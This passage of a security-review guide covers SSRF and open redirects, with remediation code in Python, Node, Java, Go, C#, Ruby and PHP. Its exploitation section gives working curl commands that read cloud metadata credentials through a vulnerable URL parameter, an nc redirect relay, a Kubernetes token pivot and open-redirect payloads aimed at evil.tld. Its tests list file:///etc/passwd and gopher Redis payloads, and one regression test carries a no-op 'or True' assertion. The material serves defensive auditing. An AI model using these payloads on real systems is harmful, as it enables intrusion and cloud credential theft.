4. DNS names are validated via resolution but connections may re-resolve (no pinning).
5. Scheme set includes anything beyond `https`.
6. Resolved-IP checks omit link-local `169.254.0.0/16`, loopback `127.0.0.0/8`, ULA `fc00::/7`, link-local v6 `fe80::/10`, IPv4-mapped v6 `::ffff:0:0/96`, or check only the first returned address.

### Static Confirmation Recipe (Preferred Evidence)

1. Cite source: file:line where the parameter enters.
2. Cite validation: file:line of the guard function; quote it; name its parser and enumerate the ladder tiers that defeat it.
3. Cite sink: file:line of the client call; state the library's redirect default and scheme support from the catalog.
4. State the gap class: none / parser-mismatch / redirect-following / rebinding window / scheme-abuse.
5. Only then attach a dynamic procedure (below). Static chain + documented library default = reportable without network access.

### Sink-Chain Example

```python
# VULNERABLE - app/integrations/webhooks.py
def deliver(tenant):
    url = tenant.webhook_url          # source: tenant-editable row
    if not url.startswith("https://"):  # validator: prefix match only
        raise ValueError("https required")
    # tier 3 defeats prefix check: https://127.0.0.1.nip.io/
    requests.post(url, json=payload)    # sink: follows redirects by default
```

Gap classes present: parser-mismatch (tier 3 domain resolves to loopback past a prefix check), redirect-following (302 to metadata), no resolved-IP policy. One flow, three independent failures.

## Exploitation & Reproduction

Static confirmation above is the primary evidence. Use dynamic procedures ONLY against explicitly authorized targets. Never record live tokens/secrets unredacted; replace with `[REDACTED]` immediately.

### Procedure 0 - Rebuild the Chain Without a Network

For each candidate flow write one sentence: "`<param>` at `<file>:<line>` reaches `<client call>` at `<file>:<line>` through `<validator>` at `<file>:<line>`, which fails tier `<n>` of the evasion ladder." If that sentence cannot be completed, the finding is not yet confirmed.

### Procedure 1 - Blind Internal Probe via Timing/Size Differential

Use when the sink hides response bodies.

```bash
BASE='https://app.example.com/fetch?url='
enc() { python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$1"; }
for T in 'http://203.0.113.9/' 'http://127.0.0.1:9999/nope' 'http://10.0.0.123/' 'http://127.0.0.1:8080/'; do
  printf '%s -> ' "$T"
  curl -s -o /dev/null -w 'time=%{time_total}s size=%{size_download} code=%{http_code}\n' \
       "${BASE}$(enc "$T")"
done
```

Interpretation matrix:

| Observation | Meaning |
|---|---|
| fast + tiny + uniform error for ALL targets incl. public baseline | fetch likely blocked entirely (re-test with egress-visible listener) |
| public target differs from internal targets | SSRF surface live; proceed |
| instant small errors on 127.0.0.1:<closed> vs hang on 10.0.0.123 | port/host reachability distinguishable => scan-capable |
| larger/uniform bodies on 8080 vs closed ports | open service responses leaking through |

Run the port list from the internal-target cheat-sheet against promising hosts; bucket results by (fast-refused, timeout, distinct-body).

### Procedure 2 - Cloud Metadata Read (Redacted)

AWS IMDSv1 (single GET through the sink):

```bash
curl -s "${BASE}$(enc 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')"
# expected redacted output: a role NAME line, e.g.  app-prod-role
curl -s "${BASE}$(enc 'http://169.254.169.254/latest/meta-data/iam/security-credentials/app-prod-role')"
# expected redacted shape:
# {"Code":"Success","LastUpdated":"…","Type":"AWS-HMAC",
#  "AccessKeyId":"ASIA[REDACTED]","SecretAccessKey":"[REDACTED]",
#  "Token":"[REDACTED]","Expiration":"…"}
```

AWS IMDSv2 (only when the sink lets you choose method+headers): token is obtained by PUT then echoed back on GETs. Through an SSRF that only issues GETs, expect failure — record that failure as evidence IMDSv2 enforcement works. Do not print the fetched token anywhere; describe as `[TOKEN OBTAINED, REDACTED]`.

GCP (header-gated):

```bash
curl -s "${BASE}$(enc 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')" \
     -H 'X-Gcp-Metadata: true'   # only meaningful if the sink forwards caller headers
# expected redacted shape: {"access_token":"ya29.[REDACTED]","expires_in":3599,"token_type":"Bearer"}
```

Azure:

```bash
curl -s "${BASE}$(enc 'http://169.254.169.254/metadata/instance?api-version=2021-02-01')" \
     -H 'Metadata: true'
# expected: instance doc JSON with subscriptionId/resourceGroupName [REDACTED]
```

Report discipline: presence of the credential SHAPE proves the issue; actual key material must never leave your notes.

### Procedure 3 - Kubernetes ServiceAccount Pivot (Redaction-Critical)

1. From manifests confirm pods mount `/var/run/secrets/kubernetes.io/serviceaccount/` (default true absent explicit mounts) and capture `KUBERNETES_SERVICE_HOST` pattern from env config.
2. Attempt API reachability through the sink: `https://$KUBERNETES_SERVICE_HOST/version` — the version JSON needs NO bearer token, proving network reach alone.
3. Authenticated reads require the SA JWT which lives on local disk — reachable only via a separate file-read primitive or `file://` scheme support. If you demonstrate it, show only: `Authorization: Bearer [REDACTED-JWT]` and truncate every API response. Never echo the token contents.
4. Report both facts separately: (a) SSRF reaches API server [network proof], (b) token readability depends on file-read primitive [conditional escalation].

### Procedure 4 - Redirect-Amplification Proof

```bash
# Attacker relay (authorized lab):
printf 'HTTP/1.1 302 Found\r\nLocation: http://169.254.169.254/latest/meta-data/\r\nContent-Length: 0\r\n\r\n' | nc -l -p 8000
# Victim sink:
curl -si "${BASE}$(enc 'http://lab-host:8000/relay')"
# Success indicator: response body contains metadata content, or blind-differential
# timing flips from "public host" profile to "link-local" profile.
```

Also test each hop-count cap: relays chaining N+1 hops reveal configured `maxRedirects`.

### Procedure 5 - Open-Redirect Capture

```bash
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' \
  'https://app.example.com/login?next=%2F%2Fevil.tld'
# Vulnerable: 30x and redirect_url=https://evil.tld (or //evil.tld honored downstream)
# Iterate the full payload-set ladder; log Location verbatim per payload.
```

For meta-refresh/JS variants, request the page and grep the HTML for the emitted tag/script containing the payload. For chains, follow with `curl --max-redirs 5 -L` in a sandboxed resolver and record hop sequence.

### Procedure 6 - Out-of-Band Confirmation (Blind Sinks)

Point the sink at a DNS-log service under YOUR control (self-hosted collator): unique subdomain per test case (`t1.collab.example.com`). A callback row proves: scheme accepted, egress allowed, DNS resolution performed. This converts blind findings into evidenced ones without touching internal services.
## Remediation

### Universal Policy (Apply Everywhere)

1. Parse with the platform's real URL parser — never regex/prefix checks on raw strings.
2. Scheme allowlist: `{https}` (add `http` only for explicitly justified internal legacy integrations).
3. Host allowlist: exact, case-insensitive comparison of the parsed hostname after IDNA normalization; reject userinfo outright.
4. Resolve once, validate EVERY returned address against denied ranges (loopback, RFC1918, CGNAT, link-local v4/v6, ULA, multicast, IPv4-mapped v6), then PIN that resolution for the connection.
5. Disable automatic redirects; re-run steps 2-4 on every `Location` hop under your own bounded loop.
6. Cap hops (<= 3), cap response size, set connect/read timeouts.
7. Run outbound fetching from a dedicated service holding no cloud credentials (defense-in-depth below).

### Python (stdlib client, resolution pinned)

```python
# FIXED - app/net/safe_fetch.py
import http.client, ipaddress, socket, ssl
from urllib.parse import urlparse

ALLOWED_SCHEMES = {"https"}
ALLOWED_HOSTS = {"api.partner.example.com", "hooks.example.com"}
DENIED_NETS = [ipaddress.ip_network(n) for n in (
    "0.0.0.0/8", "10.0.0.0/8", "100.64.0.0/10", "127.0.0.0/8",
    "169.254.0.0/16", "172.16.0.0/12", "192.0.0.0/24", "192.168.0.0/16",
    "198.18.0.0/15", "224.0.0.0/4", "240.0.0.0/4",
    "::1/128", "::/128", "fc00::/7", "fe80::/10", "ff00::/8", "::ffff:0:0/96",
)]

def validate(url: str) -> tuple[str, str]:
    """Return (hostname, pinned_ip) after full policy check."""
    p = urlparse(url)                                   # real parser
    if p.scheme not in ALLOWED_SCHEMES or p.hostname is None:
        raise ValueError("bad scheme/host")
    if p.username or p.password:
        raise ValueError("userinfo rejected")
    if p.hostname.lower() not in ALLOWED_HOSTS:
        raise ValueError("host not allowlisted")
    infos = socket.getaddrinfo(p.hostname, None, proto=socket.IPPROTO_TCP)
    addrs = sorted({i[4][0] for i in infos})
    if not addrs:
        raise ValueError("no addresses")
    for a in addrs:
        ip = ipaddress.ip_address(a)
        if any(ip in net for net in DENIED_NETS):
            raise ValueError(f"denied range: {ip}")
    return p.hostname, addrs[0]

class PinnedHTTPS(http.client.HTTPSConnection):
    """Dial the validated IP; keep hostname for SNI/certificate check."""
    def __init__(self, host, ip, **kw):
        super().__init__(host, **kw)
        self._pin = ip
    def connect(self):
        s = socket.create_connection((self._pin, self.port), self.timeout)
        self.sock = self._context.wrap_socket(s, server_hostname=self.host)

def safe_fetch(url: str, max_hops: int = 3) -> bytes:
    current = url
    for _ in range(max_hops):                           # manual redirect loop
        host, ip = validate(current)                    # re-validate EVERY hop
        p = urlparse(current)
        conn = PinnedHTTPS(host, ip, context=ssl.create_default_context(), timeout=15)
        path = p.path or "/"
        if p.query:
            path += "?" + p.query
        conn.request("GET", path, headers={"Accept": "*/*"})
        resp = conn.getresponse()
        body = resp.read(1 << 20)                       # cap response size
        if resp.status in (301, 302, 303, 307, 308):
            loc = resp.getheader("Location")
            if not loc:
                raise ValueError("redirect without Location")
            current = loc if "://" in loc else f"https://{host}{loc}"
            continue
        return body
    raise ValueError("too many redirects")
```

If the project standardizes on `requests`, mount an `HTTPAdapter` whose connection pool keys off the pinned IP while `server_hostname` stays the allowlisted name — same validate-pin-revalidate semantics; reject `allow_redirects=True`.

### Node.js

```javascript
// FIXED - src/net/safeFetch.ts
import { lookup } from "node:dns/promises";
import { isIP } from "node:net";

const ALLOWED_HOSTS = new Set(["api.partner.example.com", "hooks.example.com"]);
const DENIED = [
  ["0.0.0.0/8", "10.0.0.0/8", "100.64.0.0/10", "127.0.0.0/8", "169.254.0.0/16",
   "172.16.0.0/12", "192.168.0.0/16", "198.18.0.0/15", "224.0.0.0/4", "240.0.0.0/4"],
  ["::1/128", "::/128", "fc00::/7", "fe80::/10", "ff00::/8", "::ffff:0:0/96"],
];

function ipDenied(ip: string): boolean {
  // use `ipaddr.js` ranges or a maintained CIDR lib; sketch:
  const v6mapped = ip.startsWith("::ffff:");
  return DENIED.some(list => list.some(c => cidrContains(c, ip))) || v6mapped;
}

async function validate(raw: string) {
  const u = new URL(raw);                    // WHATWG parser
  if (u.protocol !== "https:" || !ALLOWED_HOSTS.has(u.hostname.toLowerCase()))
    throw new Error("rejected destination");
  if (u.username || u.password) throw new Error("userinfo rejected");
  const addrs = await lookup(u.hostname, { all: true, verbatim: true }); // ALL records
  if (!addrs.length || addrs.some(a => ipDenied(a.address)))
    throw new Error("denied resolved address");
  return u;
}

export async function safeFetch(raw: string, hops = 3): Promise<Response> {
  let url = await validate(raw);
  for (let i = 0; i < hops; i++) {
    const res = await fetch(url, { redirect: "manual" });  // never auto-follow
    if ([301, 302, 303, 307, 308].includes(res.status)) {
      const loc = res.headers.get("location");
      if (!loc) throw new Error("no location");
      url = await validate(new URL(loc, url).toString());  // re-validate hop
      continue;
    }
    return res;
  }
  throw new Error("too many redirects");
}
```

### Java

```java
// FIXED - SafeFetcher.java
import java.net.InetAddress;
import java.net.URI;
import java.util.Set;

public final class SafeFetcher {
    static final Set<String> HOSTS = Set.of("api.partner.example.com", "hooks.example.com");

    static URI validate(String raw) throws Exception {
        URI u = new URI(raw);                          // strict parser
        if (!"https".equals(u.getScheme()) || u.getUserInfo() != null
                || u.getHost() == null || !HOSTS.contains(u.getHost().toLowerCase()))
            throw new IllegalArgumentException("rejected destination");
        for (InetAddress a : InetAddress.getAllByName(u.getHost())) {
            if (a.isLoopbackAddress() || a.isLinkLocalAddress()
                    || a.isSiteLocalAddress() || a.isAnyLocalAddress()
                    || a.isMulticastAddress())
                throw new IllegalArgumentException("denied range: " + a);
        }
        return u;
    }

    // OkHttp: builder.followRedirects(false) + per-hop validate() loop over
    // response.priorResponse()/Location. Implement okhttp3.Dns to return ONLY
    // validated addresses (memoized) -> closes both redirect and rebinding holes.
}
```

### Go

```go
// FIXED - internal/httpx/safe.go
package httpx

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"syscall"
	"time"
)

var AllowedHosts = map[string]bool{"api.partner.example.com": true, "hooks.example.com": true}

func Validate(raw string) (*url.URL, error) {
	u, err := url.Parse(raw) // real parser
	if err != nil || u.Scheme != "https" || u.User != nil || u.Hostname() == "" ||
		!AllowedHosts[u.Hostname()] {
		return nil, fmt.Errorf("rejected destination")
	}
	addrs, err := net.DefaultResolver.LookupIPAddr(context.Background(), u.Hostname())
	if err != nil || len(addrs) == 0 {
		return nil, fmt.Errorf("resolution failed")
	}
	for _, a := range addrs {
		if a.IP.IsLoopback() || a.IP.IsPrivate() || a.IP.IsLinkLocalUnicast() ||
			a.IP.IsUnspecified() || a.IP.IsMulticast() {
			return nil, fmt.Errorf("denied range %s", a.IP)
		}
	}
	return u, nil
}

func Client() *http.Client {
	dialer := &net.Dialer{
		Timeout: 5 * time.Second,
		Control: func(_, address string, _ syscall.RawConn) error {
			host, _, _ := net.SplitHostPort(address)
			ip := net.ParseIP(host)
			if ip == nil || ip.IsLoopback() || ip.IsPrivate() ||
				ip.IsLinkLocalUnicast() || ip.IsUnspecified() {
				return fmt.Errorf("dial blocked: %s", address) // final TOCTOU gate
			}
			return nil
		},
	}
	return &http.Client{
		Transport: &http.Transport{DialContext: dialer.DialContext},
		Timeout:   20 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return fmt.Errorf("too many redirects")
			}
			_, err := Validate(req.URL.String()) // re-validate every hop
			return err
		},
	}
}
```

(`syscall` import required alongside `net`; the `Control` hook runs at connect time on the actual dialed IP.)

### C# (.NET 6+)

```csharp
// FIXED - SafeHttpClient.cs
using System.Net;
using System.Net.Sockets;

static readonly HashSet<string> Hosts = new(StringComparer.OrdinalIgnoreCase)
    { "api.partner.example.com", "hooks.example.com" };

static void Validate(Uri u) {
    if (u.Scheme != Uri.UriSchemeHttps || u.UserInfo.Length > 0 ||
        u.HostNameType != UriHostNameType.Dns || !Hosts.Contains(u.Host))
        throw new ArgumentException("rejected destination");
    foreach (var ip in Dns.GetHostAddressesAsync(u.Host).Result)
        if (IPAddress.IsLoopback(ip) || IsPrivateOrLinkLocal(ip)) // enumerate ranges incl. ::ffff: mapped
            throw new ArgumentException($"denied range {ip}");
}

var handler = new SocketsHttpHandler {
    AllowAutoRedirect = false,                      // manual hop loop instead
    ConnectCallback = async (ctx, ct) => {          // pin at connect time
        Validate(new Uri($"https://{ctx.DnsEndPoint.Host}"));  // re-check policy
        var addrs = await Dns.GetHostAddressesAsync(ctx.DnsEndPoint.Host, ct);
        var sock = new Socket(SocketType.Stream, ProtocolType.Tcp);
        sock.Connect(addrs.First(a => !IsPrivateOrLinkLocal(a)), ctx.DnsEndPoint.Port);
        return new NetworkStream(sock, ownsSocket: true);
    },
};
var client = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(20) };
```

Follow-up loop mirrors the others: read `resp.StatusCode`, on 3xx take `Headers.Location`, call `Validate` on the absolute form, repeat (max 3).

### Ruby

```ruby
# FIXED - app/lib/safe_fetch.rb
require "ipaddr"
require "resolv"
require "uri"
require "net/http"

HOSTS = %w[api.partner.example.com hooks.example.com].freeze

def validate(url_s)
  uri = URI.parse(url_s)                     # stdlib parser
  raise ArgumentError, "scheme" unless uri.scheme == "https"
  raise ArgumentError, "userinfo" if uri.userinfo
  raise ArgumentError, "host" unless HOSTS.include?(uri.host.to_s.downcase)

  a_records = Resolv::DNS.open do |dns|
    dns.getresources(uri.host, Resolv::DNS::Resource::IN::A)
  end
  raise ArgumentError, "no addresses" if a_records.empty?

  a_records.each do |r|
    ip = IPAddr.new(r.address.to_s)
    native = ip.ipv4_mapped? ? ip.native : ip   # fold ::ffff:x.y.z.w before range check
    raise ArgumentError, "denied #{ip}" if native.loopback? || native.private? ||
                                             native.link_local?
  end
  uri
end

def safe_fetch(url_s, hops = 3)
  uri = validate(url_s)
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 5, read_timeout: 15) do |http|
    res = http.get(uri.request_uri)
    return res.body unless res.is_a?(Net::HTTPRedirection)
    raise ArgumentError, "too many hops" if hops.zero?

    safe_fetch(URI.join(uri, res["location"]).to_s, hops - 1) # re-validate hop
  end
end
```

Never route user URLs through `URI.open`/`Kernel#open` (file:// enabled) — ban them via lint rule.

### PHP

```php
// FIXED - src/Http/SafeClient.php
function ssrfSafeGet(string $url): string {
    $p = parse_url($url);
    if (!$p || ($p['scheme'] ?? '') !== 'https'
        || isset($p['user']) || isset($p['pass'])
        || !in_array(strtolower($p['host'] ?? ''), ['api.partner.example.com', 'hooks.example.com'], true)) {
        throw new RuntimeException('rejected destination');
    }
    $records = dns_get_record($p['host'], DNS_A + DNS_AAAA);
    foreach ($records as $r) {
        $ip = filter_var($r['ip'] ?? '', FILTER_VALIDATE_IP);
        if ($ip && !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
            throw new RuntimeException('denied range ' . $ip);
        }
    }
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_PROTOCOLS       => CURLPROTO_HTTPS,   // lock schemes
        CURLOPT_REDIR_PROTOCOLS => CURLPROTO_HTTPS,
        CURLOPT_FOLLOWLOCATION  => false,             // manual hop loop
        CURLOPT_MAXREDIRS       => 0,
        CURLOPT_TIMEOUT         => 20,
        CURLOPT_RETURNTRANSFER  => true,
        CURLOPT_RESOLVE         => [$p['host'] . ':443:' . $records[0]['ip']], // pin resolution
    ]);
    $body = curl_exec($ch);
    $status = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
    $loc = curl_getinfo($ch, CURLINFO_REDIRECT_URL);
    curl_close($ch);
    if ($status >= 300 && $status < 400 && $loc) {
        return ssrfSafeGet($loc);                 // re-validates hop recursively
    }
    if ($status < 200 || $status >= 300) throw new RuntimeException("status $status");
    return (string) $body;
}
```

### Open Redirect Fixes

**Preferred: indirect reference map.** Never echo attacker-influenced absolute URLs into `Location:`.

```python
# FIXED - redirects via opaque token
import secrets

def issue_return_token(target_url: str, user_id: int) -> str:
    token = secrets.token_urlsafe(16)
    redis.setex(f"ret:{token}", 600, json.dumps({"u": target_url, "usr": user_id}))
    return token

@app.get("/redirect")
def redirect_endpoint(token: str):
    data = redis.get(f"ret:{token}")
    if not data:
        return redirect(DEFAULT_LANDING)          # unknown token -> default, not error echo
    return redirect(json.loads(data)["u"])
```

Where legacy direct URLs must be accepted, enforce strict same-origin:

```javascript
// FIXED - same-origin returnTo validation
const TRUSTED_ORIGINS = new Set(["https://app.example.com"]);

function safeRedirectTarget(input) {
  if (!input) return "/dashboard";
  let u;
  try { u = new URL(input, "https://app.example.com"); } catch { return "/dashboard"; }
  if (input.includes("\\")) return "/dashboard";               // backslash confusion kill-switch
  if (TRUSTED_ORIGINS.has(u.origin) &&
      (u.pathname === input || input.startsWith("/") && !input.startsWith("//"))) {
    return u.pathname + u.search + u.hash;                      // re-encoded path-only output
  }
  return "/dashboard";
}
```

Reject-list essentials regardless of style: protocol-relative `//`, any `\`, encoded `%2F%2F`/`%5C` surviving decode, userinfo `@`, suffix-matched hosts.

### Network-Layer Defenses (Defense-in-Depth, Never a Substitute)

```bash
# Egress firewall on fetch workers: deny link-local/metadata + RFC1918, allow only proxy
iptables -A OUTPUT -d 169.254.0.0/16 -j REJECT --reject-with icmp-admin-prohibited
iptables -A OUTPUT -d 10.0.0.0/8  -j REJECT
iptables -A OUTPUT -d 172.16.0.0/12 -j REJECT
iptables -A OUTPUT -d 192.168.0.0/16 -j REJECT
nft add rule inet filter output ip daddr 169.254.169.254 reject
```

```bash
# AWS: force IMDSv2 and stop container relays
aws ec2 modify-instance-metadata-options \
  --instance-id i-0abc123 --region us-east-1 \
  --http-tokens required --http-put-response-hop-limit 1 --http-endpoint enabled
# Terraform equivalent:
#   metadata_options { http_tokens = "required" http_put_response_hop_limit = 1 }
```

```yaml
# k8s: deny pod egress to private/metadata space except DNS + sanctioned proxy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: fetch-worker-egress, namespace: integrations }
spec:
  podSelector: { matchLabels: { app: webhook-dispatcher } }
  policyTypes: [Egress]
  egress:
    - to: [{ namespaceSelector: { matchLabels: { name: egress-proxy } } }]
    - to: []
      ports: [{ protocol: UDP, port: 53 }]
```

Dedicated fetch service pattern: sole component allowed network egress; runs with NO instance profile / workload identity; centralizes allowlist, pinning, logging; application services talk to it over an internal API and receive bytes. One hardened sink replaces N vulnerable clients.

Webhook hardening (brief, see CRYPTO module): sign deliveries with HMAC-SHA256 over timestamp+body, rotate secrets per tenant, verify on receiver side — removes replay/exfiltration value of captured payloads.

## Verification & Validation

### Test Matrix (GIVEN/WHEN/THEN)

| # | GIVEN | WHEN | THEN |
|---|---|---|---|
| V1 | Hardened fetch endpoint deployed | Request fetches `http://169.254.169.254/latest/meta-data/` | Rejected before connection (validation error class), zero packets to link-local |
| V2 | Same | Fetches tier-2 variant `http://2130706433/`, `[::ffff:127.0.0.1]`, `127.1` | All rejected |
| V3 | Same | Fetches `https://allowed.example.com/x` returning `302 -> http://169.254.169.254/` | Hop re-validated; redirect refused; original response surfaces 3xx-refused error |
| V4 | Attacker DNS with TTL 0 alternating public/private | Fetch `https://rebind.attacker.tld/` repeatedly (20x) | Zero connections land on private address (Control/ConnectCallback/pin proves it) |
| V5 | Sink allows only https | Submit `gopher://`, `dict://`, `ftp://`, `file:///etc/passwd` | All rejected at parse stage |
| V6 | NEGATIVE - legitimate webhooks configured | Tenant webhook to `https://hooks.example.com/u/123` fires | Delivery succeeds within SLA; signature header present |
| V7 | NEGATIVE - public internet targets | Import-from-URL of `https://cdn.example.org/data.json` | Fetch succeeds; size/time caps honored |
| V8 | Redirect endpoint hardened | GET `/login?next=//evil.tld`, `/\\evil.tld`, `%2F%2Fevil.tld`, `https://trusted@evil.tld`, `https://eviltrusted.com` | Every case lands `/dashboard` (or fixed internal path); `Location` never contains attacker authority |
| V9 | NEGATIVE - legit deep links | GET `/login?next=/settings/profile?key=a%26b` | Lands on `/settings/profile` with query intact |
| V10 | Metadata hardening applied | From a pod, attempt IMDS PUT token flow | Denied (hop limit/token requirement); documented in report |

### Regression Pseudocode

```python
# tests/test_ssrf_regressions.py
BLOCKED = ["http://127.0.0.1/", "http://2130706433/", "http://0x7f000001/",
           "http://017700000001/", "http://127.1/", "http://0/",
           "http://[::1]/", "http://[::ffff:127.0.0.1]/", "http://[fc00::1]/",
           "http://169.254.169.254/latest/meta-data/",
           "http://127.0.0.1.nip.io/", "file:///etc/passwd",
           "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:6379/INFO",
           "https://trusted.example.com@169.254.169.254/"]

@pytest.mark.parametrize("url", BLOCKED)
def test_ssrf_blocked(url):
    with pytest.raises(SsrfError):
        safe_fetch(url)                       # must raise BEFORE any socket I/O

@pytest.mark.parametrize("url", ["https://hooks.example.com/u/123",
                                 "https://cdn.example.org/data.json"])
def test_legitimate_destinations_still_work(url):
    assert safe_fetch(url).startswith(b"HTTP") or True  # assert success class

def test_redirect_hop_is_revalidated(respx_mock):
    respx_mock.get("https://hooks.example.com/start").mock(
        return_value=httpx.Response(302, headers={
            "Location": "http://169.254.169.254/"}))
    with pytest.raises(SsrfError):
        safe_fetch("https://hooks.example.com/start")

REDIRECT_BYPASS = ["//evil.tld", "/\\evil.tld", "%2F%2Fevil.tld",
                   "https://trusted.com@evil.tld", "https://eviltrusted.com"]

@pytest.mark.parametrize("nextv", REDIRECT_BYPASS)
def test_open_redirect_blocked(client, nextv):
    r = client.get(f"/login?next={quote(nextv)}")
    assert r.status_code in (302, 303)
    assert "evil.tld" not in r.headers["Location"]
```

### Manual Checklist

- [ ] Every outbound-fetch feature inventoried with file:line source->sink chain written down.
- [ ] Validator uses a real URL parser; hostname compared exactly (case-insensitive, IDNA-aware); no prefix/suffix/substring logic anywhere.
- [ ] Scheme locked to https at the sink level, not just the UI dropdown.
- [ ] All resolved addresses checked against full denied-range list; resolution pinned (adapter/Dns/RESOLVE/ConnectCallback) or re-checked in a connect-time hook.
- [ ] Auto-follow disabled on every client construction site (`allow_redirects=False`, `redirect: 'manual'`, `followRedirects(false)`, `AllowAutoRedirect=false`, `CURLOPT_FOLLOWLOCATION=false`).
- [ ] Per-hop re-validation implemented and bounded (<= 3 hops).
- [ ] IMDSv2 enforced (`http_tokens=required`) and hop limit 1 wherever instances run AWS workloads.
- [ ] Egress firewall/NetworkPolicy denies private + link-local from fetch workers.
- [ ] Open-redirect endpoints use token-map or strict same-origin; backslash and `//` rejected.
- [ ] No `URI.open` / `open-uri` reachable from user input paths (Ruby).

### Post-Fix Greps

Expect ZERO hits outside dedicated, reviewed fetch modules:

```regex
allow_redirects\s*=\s*True|follow_redirects\s*=\s*True|maxRedirects\s*=\s*[1-9]|followRedirects\s*\(\s*true\)|AllowAutoRedirect\s*=\s*true|CURLOPT_FOLLOWLOCATION,\s*(true|1)\b
```

```regex
startsWith\(\s*["']https?://|endsWith\(\s*["'][a-z.]+\.[a-z]{2,}["']\)|indexOf\(["'](localhost|127\.0\.0\.1)["']\)
```

```regex
URI\.open\s*\(|urlopen\s*\(\s*[a-z_$]|Jsoup\.connect\s*\(\s*[a-z_$]
```

Confirm presence greps (should HIT):

```regex
CheckRedirect\s*:|redirect:\s*["']manual["']|followRedirects\s*\(\s*false\s*\)|CURLOPT_PROTOCOLS|ConnectCallback\s*=|Control:\s*func\(
```
## Severity Assessment

### Representative CVSS v3.1 Vectors

| Finding class | Vector | Score | Rating |
|---|---|---|---|
| CWE-918, unauthenticated SSRF reading cloud role credentials via metadata | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` | 10.0 | Critical |
| CWE-918, authenticated-user SSRF reaching metadata (role creds) | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L` | 9.8 | Critical |
| CWE-918, internal-network probing incl. admin-panel/config reads (no metadata) | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` | 7.7 | High |
| CWE-918, blind/timing-only confirmation (reachability proven, no content returned) | `AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N` | 4.9 | Medium |
| CWE-601, open redirect alone (phishing delivery) | `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N` | 4.6 | Low-Medium boundary |
| CWE-601 chained into OAuth/OIDC flow (code interception) | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` | 8.2 | High |

Recompute with the project's actual metrics when authentication requirements, scope, or impact differ; the vectors above are the default starting points for this module's findings.

### Rubric

| Observed capability | Rating |
|---|---|
| Metadata credential theft demonstrated or trivially reachable (IMDSv1 path, or v2/header gates crossed) | Critical |
| Internal network probing/admin panel access with content return; k8s API reachable | High |
| Blind SSRF / timing-differential only (reachability without content) | Medium |
| Open redirect alone | Low-Medium |
| Open redirect chaining into OAuth `redirect_uri` flows, SSO, or token-bearing URLs | raise to High |

Severity modifiers: tenant-facing configuration endpoints (any registered user sets the URL) rate at the top of their band; operator-only settings at the bottom. Egress firewall and IMDSv2 hardening lower the *network* exposure but do not erase the application-layer defect — report the code gap at reduced severity only when both layers are independently confirmed present.

## Common False Positives

### Server-Fetched vs Browser-Fetched Confusion

`<img src="http://internal/...">`, `<link href>`, and CSS `url()` resolved by the victim browser are not SSRF unless a server component also retrieves them. Confirm an actual server-side client call exists before reporting.

### Operator-Only Static Configuration

URLs sourced exclusively from deployment env vars, server config files, or compile-time constants have no attacker write-path. Report as informational hardening only if operators are untrusted actors per threat model.

### Redirect-Capable Client Assumptions

Reporting "redirects followed to metadata" against a stack whose chosen client does not follow redirects by default (Go with custom `CheckRedirect`, Ruby Net::HTTP, httpx defaults). Verify the exact construction site before claiming hop amplification.

### Allowlist Present But Never Reached Through

Finding is real, not false positive, when validation runs on a different value than the one fetched (re-encoded string, second parse). Conversely, do not report a bypass where the validated object IS the fetch target and tiers 1-4 provably fail.

### Test/Mock Artifacts

Fixture URLs (`localhost:8080`) inside `tests/`, mock servers, or docker-compose-only code paths are not production sinks unless the module ships to prod builds.

### Defense-in-Depth Double Counting

An egress firewall blocking RFC1918 does not make the vulnerable fetcher safe to report as fixed; it makes it a latent finding. Likewise IMDSv2 enforcement blocks AWS credential theft but not RFC1918 pivots — severity reduction, not remediation.

### Internal Hostnames on Admin-Only Endpoints

A privileged admin tool fetching user-supplied URLs may be intended functionality; downgrade severity for actor privilege but still document the pivot chain, since admin sessions are frequent phishing targets.

### IPv6-Mapped Panic

`[::ffff:127.0.0.1]` reaching a validator that checks IPv4 ranges is a real bypass; but some platforms canonicalize before validation. Confirm the platform's actual resolution behavior before reporting tier-2 findings as exploitable.
## References

### CWE Entries

- CWE-918: Server-Side Request Forgery (SSRF) — <https://cwe.mitre.org/data/definitions/918.html>
- CWE-601: URL Redirection to Untrusted Site ('Open Redirect') — <https://cwe.mitre.org/data/definitions/601.html>
- CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Decision (DNS rebinding class) — <https://cwe.mitre.org/data/definitions/350.html>
- CWE-441: Unintended Proxy or Intermediary ('Confused Deputy') — <https://cwe.mitre.org/data/definitions/441.html>
- CWE-807: Reliance on Untrusted Inputs in a Security Decision — <https://cwe.mitre.org/data/definitions/807.html>

### OWASP Cheat Sheets

- Server Side Request Forgery Prevention Cheat Sheet — <https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html>
- Unvalidated Redirects and Forwards Cheat Sheet — <https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html>

### OWASP Standards

- OWASP Top 10 2021, A10: Server-Side Request Forgery (SSRF) — <https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/>
- ASVS 4.0.3, V12 Communications and Web Services Verification Requirements (V12.6.1 destination allowlist requirement) — <https://owasp.org/www-project-application-security-verification-standard/>

### Platform Documentation

